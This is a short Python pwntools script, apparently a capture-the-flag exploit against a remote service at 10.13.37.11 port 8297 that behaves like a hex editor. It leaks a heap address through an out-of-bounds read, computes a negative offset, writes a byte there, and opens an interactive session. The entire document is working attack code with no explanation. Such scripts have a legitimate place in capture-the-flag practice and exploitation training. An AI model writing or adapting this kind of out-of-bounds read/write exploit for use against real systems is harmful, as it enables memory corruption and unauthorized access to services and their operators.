from pwn import *

HOST = "10.13.37.11"
PORT = 8297
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.20',1234)
def k(dat):
  s.recvuntil('>')
  s.sendline(dat)

k("o a.png")
k("p 20 @-32672")
r = s.recvuntil('  ')
heap = r.replace(' ','').decode('hex')
heap = u64(heap) + 0x7f88
print hex(heap)
print str(heap-0x00604618)
k("w 0x41 @-"+str(heap-0x00604618))
s.interactive()
